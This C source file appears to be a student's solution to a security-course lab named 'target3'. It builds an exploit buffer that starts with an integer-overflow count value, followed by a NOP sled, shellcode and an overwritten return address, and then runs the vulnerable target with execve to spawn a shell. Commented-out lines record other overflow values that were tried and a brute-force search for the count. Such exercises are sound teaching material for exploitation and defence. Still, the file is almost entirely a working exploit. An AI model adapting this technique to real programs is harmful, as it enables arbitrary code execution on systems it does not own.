#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90

struct widget_t {
  double x;
  double y;
  int count;
};

int main(void)
{
  char *args[3];
  char *env[1];

  char *buffer;

  buffer = malloc(240 * sizeof(struct widget_t) + 8 + 11);
 
  char count[] = "2147483889,";
  
  int i, j;
  for (i = 0; i < 11; i++) {
    buffer[i] = count[i];
  }

  for (i = i; i < 240 * sizeof(struct widget_t) + 4 - sizeof(shellcode) + 8; i++) {
    buffer[i] = 0x90;
  }

  for (i = i, j = 0; j < sizeof(shellcode); i++, j++) {
    buffer[i] = shellcode[j];
  }

  i--;

  buffer[i++] = 0x11;
  buffer[i++] = 0xe0;
  buffer[i++] = 0xff;
  buffer[i++] = 0xbf;

  buffer[i++] = 0x11;
  buffer[i++] = 0xe0;
  buffer[i++] = 0xff;
  buffer[i++] = 0xbf;

  //-1789569466 
  //buffer[0] = '-'; buffer[1] = '1'; buffer[2] = '7'; buffer[3] = '8'; buffer[4] = '9';  buffer[5]  = '5'; 
  //buffer[6] = '6'; buffer[7] = '9'; buffer[8] = '4'; buffer[9] = '6'; buffer[10] = '6'; buffer[11] = ',';
  
  //4294967873
  // buffer[0] = '4'; buffer[1] = '2'; buffer[2] = '9'; buffer[3] = '4'; buffer[4] = '9';  buffer[5]  = '6'; 
  // buffer[6] = '7'; buffer[7] = '8'; buffer[8] = '7'; buffer[9] = '3'; buffer[10] = ',';

  //178957211
  // buffer[0] = '1'; buffer[1] = '7'; buffer[2] = '8'; buffer[3] = '9'; buffer[4] = '5'; 
  // buffer[5] = '7'; buffer[6] = '2'; buffer[7] = '1'; buffer[8] = '1'; buffer[9] = ',';

  //-178957211
  // buffer[0] = '-'; buffer[1] = '1'; buffer[2] = '7'; buffer[3] = '8'; buffer[4] = '9'; buffer[5] = '5'; 
  // buffer[6] = '7'; buffer[7] = '2'; buffer[8] = '1'; buffer[9] = '1'; buffer[10] = ',';

  //2147483889
  // buffer[0] = '2'; buffer[1] = '1'; buffer[2] = '4'; buffer[3] = '7'; buffer[4] = '4';  buffer[5]  = '8'; 
  // buffer[6] = '3'; buffer[7] = '8'; buffer[8] = '8'; buffer[9] = '9'; buffer[10] = ',';

  // for (i = 11; i < size1 - sizeof(shellcode) + 11; i++) {
  // 	buffer[i] = NOP;
  // }
  // i++;
  // printf("shell code starts around i = %d\n", i-10);
  // for (j = 0, i = i; j < sizeof(shellcode); j++, i++) {
  // 	buffer[i] = shellcode[j];
  // }

  // unsigned int num = 0x80000000;
  // int hi = 0;
  // while (hi < 200) {
  //   if (num * 20 % 241 == 0 && num * 20 != 0)
  //   {
  //     printf("0x%x\n", num);
  //     break;
  //   }
  // 	// hi = num;
  // 	// if (hi < 240 && hi * sizeof(struct widget_t) > sizeof(struct widget_t) * 240)
  // 	// {
  // 	// 	printf("num = %d (%x)\n", hi, hi);
  // 	// 	printf("(hi*sizeof(struct widget_t)) - 5768 = %d\n", (hi*sizeof(struct widget_t)) - 5768);
  // 	// }
  // 	num++;
    
  // }

  
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
